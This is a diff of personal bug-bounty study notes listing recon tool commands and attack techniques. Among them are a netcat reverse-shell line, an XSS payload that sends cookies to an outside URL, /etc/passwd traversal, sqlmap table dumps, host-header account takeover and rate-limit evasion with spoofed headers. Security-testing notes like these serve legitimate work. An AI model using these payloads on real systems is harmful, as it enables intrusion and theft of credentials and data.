@@ -2,7 +2,35 @@ https://securitytrails.com/
 
 [API key]12@
 
-https://wordlists.assetnote.io/
+https://www.bugbountyhunting.com
+
+[Search for: Tips- Write-ups - Payloads - and more]
+
+https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
+
+https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
+
+[SSRF CHEAT SHEET]
+
+https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
+
+[URL validator cheat sheet]
+
+Dnslog.cn
+
+Interactsh
+
+[alternative to burp collaborator]
+
+https://hacktify.in/csrf/
+
+[CSRF POC]
+
+https://nitinyadav00.github.io/Bug-Bounty-Search-Engine/
+
+[Automate Google dork]
+
+https://wordlists.assetnote.io/f
 
 [word lists]
 
@@ -219,6 +247,12 @@ datasources:
 - sudo apt install ffuf -y
 - ffuf -u "[http://FUZZ.URL.com](http://fuzz.stripe.com/)" -w /usr/share/wordlists/dirbuster/directories.jbrofuzz
 - gobuster dns -d URL[.com](http://stripe.com/) -w /usr/share/wordlists/wordlist.txt
+- $gobuster dir -u "[https://on](https://one.newrelic.com/dashboards?account=4676549&state=e196b296-20dd-0a38-aaf8-063779307cff).com" -w /usr/share/wordlists/common.txt  [directory bruteforcing]
+- gobuster dir -u URL.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 308
+- gobuster dir -u “URL.com” -w /usr/share/wordlists/raft-large-directories.txt --exclude-length 645
+- go install [github.com/tomnomnom/assetfinder@latest](http://github.com/tomnomnom/assetfinder@latest)
+- export PATH=$PATH:$(go env GOPATH)/bin
+- assetfinder -subs-only URL.COM
 - amass enum -d URL[.com](http://stripe.com/) -brute -w /usr/share/wordlists/wordlist.txt -v
 - amas enum -d [URL.com](http://URL.com) -nocolor -v
 
@@ -261,6 +295,10 @@ OR
 
 [bypass WAF and finding Origin IP/server]
 
+- nmap website_ip -sC -sV -p 80 --script=vuln --vv
+
+[Nmap vulnerability scan]
+
 [+] sudo apt install naabu -y
 
 - naabu -l <file.txt> -o <new.txt> -top-ports -v
@@ -296,16 +334,35 @@ OR
 
 - gitclone katana and move main <mv main.go  /bin/katana/>
 - katana -u "URL.com" -jc -d 4
+- katana -u https://target.com -jc -d 2 | grep ".js$" | uniq | sort > js.txt  [js crawl]
 
 [active scanning and endpoint scanning]
 
 N.B:
 
-- use the common wordlists for directory bruteforcing or content discovery
+- Google dork - https://www.freedium.cfd/https://infosecwriteups.com/top-google-dorks-explained-ee6cac1673da
+- dork for programs - https://github.com/sushiwushi/bug-bounty-dorks
+- use the common wordlists for directory bruteforcing or content discovery OR  use dirbuster mediuem.txt file for dir enum
 - go sudo su mode for amass sub domain enum
 - | sort -u eliminates duplicate subdomains for amass and subfinder whole “=” does same for crawled endpoints using tools like gau, katana or wayback.
 - cat new.txt file.txt for.txt | sort -u [ways to cat and sort all subdomains]
-- 
+- Assetfinder for subdomain enumeration
+- If you want to append to the file rather than overwrite it, use `>>` instead of `>`:
+- Subzy for subdomain takeover
+- Termux
+
+```bash
+export GOPATH=$HOME/go
+export PATH=$PATH:$GOPATH/bin
+```
+
+# GO-TO:
+
+- SUBFINDER, ASSEST FINDER OR KNOCKPY [subdomain enum]
+- DIRB, DIRBUSTER, GOBUSTER  OR FEROXBUSTER [dir enum]
+- FFUF [subdomain bruteforce and content discovery]
+- GAU OR KATANA [endpoint crawling]
+- ARJUN [parameter crawling]
 
 UNION SELECT NULL,NULL,NULL--
 [SQL COLUMN]
@@ -362,6 +419,10 @@ sudo openvpn nmap -sV {target IP}
 
 400
 [Bad Request]
+
+#ATO
+
+[+] in host header add <burpcollaburl.com:redactedurl.com> then reset the password 
 
 #LFI
 [+] intercept download file and check if file path before endpoint is in '.php?'
@@ -422,6 +483,39 @@ sudo openvpn nmap -sV {target IP}
 - locate "/.git" directory
 - "wget -r (url)" to get folders in git then analyse the git file using "view master's history" option on git software
 
+#RATE LIMIT 
+
+[+] Header Magic:When faced with rate limitations, headers can become your secret weapon. Introduce the following headers just under the Host Header in your request:
+X-Forwarded-For: IP
+
+X-Forwarded-Host: IP
+
+X-Client-IP: IP
+
+X-Remote-IP: IP
+
+X-Remote-Addr: IP
+
+X-Host: IP
+
+Change the IP whenever your request faces a blockade
+
+[+] Use / at the end of a URI endpoint e.g <evil.com/ratelimit/> OR 
+
+- Add a path </ratelimit/..>
+
+#CORS
+
+[+] Check for 
+
+- Access-Control-Allow-Origin: This should either return a specific trusted domain or null if restricted. If it returns * or reflects the arbitrary domain, this is a sign of misconfiguration.
+- Access-Control-Allow-Credentials: This header should only be set to true for trusted origins. If combined with * in Access-Control-Allow-Origin, it can lead to significant security risks.
+- If the Access-Control-Allow-Credentials header is set to true, test if the server is allowing cross-origin requests to include cookies, authentication tokens, or other sensitive data. This can be a critical security issue, as it may allow an attacker to steal cookies or perform actions on behalf of users.
+
+```bash
+curl -H "Origin: https://malicious.com" -I https://vulnerable-site.com
+```
+
 #FILE INCLUSION
 [+] use ";nc -e /bin/sh 192.168.136.128 8080" in net service to check RCE vulnerability while listening in port (nc --vv -l -n -p 8080)
 [+] use "?page=../../../../../etc/passwd" on site link to perform LFI (check if there is "/include.php" on site)
@@ -429,7 +523,7 @@ sudo openvpn nmap -sV {target IP}
 
 #SQL 
 
-[+] - - comments out SQ query 
+[+] - - comments out SQL query 
 
 [+] -v 3 - - TO SEE PAYLOAD BLOCKED BY WAF
 
@@ -512,6 +606,20 @@ sudo openvpn nmap -sV {target IP}
 - sqlmap -u "url" -T accounts -D owasp10 --dump ---open all database file
 [+] test url endpoints
 
+#SQLMAP 
+
+- sqlmap -r login.txt --batch --dbs
+
+[on saved login page intercept file]
+
+- sqlmap -r login.txt -D target_database --tables
+
+[find table]
+
+- sqlmap -r login.txt -D target_database -T users --dump
+
+[dumb data from a specific table]
+
 #BAC
 [+] Change admin GET request to true and forward for cookies manipulation/ change admin value to true on match & replace -- Broken Access Control
 
@@ -528,6 +636,8 @@ sudo openvpn nmap -sV {target IP}
 - if there's no useful info intercerpt and reload "/admin" error messages again and change GET to TRACE, admin file should be downloaded
 - turn off interceptor and replace the IP in the file to a default localhost IP 127.0.0.1
 - copy XSS row containing IP to macth and replace section in burp proxy and reload page--auth bypass via information disclosure
+
+[+] add <;%09/UUID >in request header parameter To get IDOR 
 
 #PATH/DIR TRIVERSAL
 [+] Test if you can load images/pages by manipulating endpoint with "=" sign
@@ -573,6 +683,12 @@ sudo openvpn nmap -sV {target IP}
 
 #XSS
 
+N.B
+
+Google dork for XSS endpoints
+
+inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:URL.com
+
 DOM - modifying JS environments like windows.location in URL. Client side related / targets the JS that processes user input 
 
 Stored - found on server side like comments and profile
@@ -591,14 +707,20 @@ N.B - if code search word reflects in HTML code/response and in the URL it is RX
 
 [+] Test  >'<"//:=;!- - 
 
-[+] <Img Src=OnXSS OnError=confirm(1)> -- WAF Bypass payload
+[+] <Img Src=OnXSS OnError=confirm(1)> 
+
+- <a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
+
+-- WAF Bypass payload
 
 [+] filter for JS file(API, db, password, users and keys) in dev tools network tab 
 
 [+] <img src=x onerror=this.src='http://
 /?'+document.cookie;> — Steal cookies 
 
-[+] </script>'"><img src=x onError=prompt(1)>
+[+] </script>'"><img src=x onError=prompt(1)>
+
+[+] `'>+<script>alert()</script>`
 
 [+] <script>alert(1)<! –
 
@@ -625,8 +747,8 @@ N.B - if code search word reflects in HTML code/response and in the URL it is RX
 
 - paste XSS in url when trapped in the ID or SELECT tag
 
-[+] Use Wappalyzer to cehck site Library
-[+] Bypaas back tick "${alert(2)}"
+[+] Use Wappalyzer to check site Library
+[+] Bypass back tick "${alert(2)}"
 [+] Escape backward slash with {\';alert(5);//}
 [+] Escape href tag parameter ');, add {alert(8);//');} behind website url in WEBSITE adding field
 
@@ -646,6 +768,12 @@ N.B - if code search word reflects in HTML code/response and in the URL it is RX
 - add "&token=sss" in URL to see where it is being injected in site
 - mark option to intercept response in proxy
 - add {;script-src-elem 'unsafe-inline'} to URL containing XSS and paste in browser --CSP token
+
+[+] zseano.html%0d%0a.jpg.
+
+- zseano.php/.jpg
+
+[bypass hardcoded file upload]
 
 #SSRF
 [+] INTERCEPT the check stock option, check for the STOCK API(mostly URL encoded so highlight it and right click convert/URL/decode)
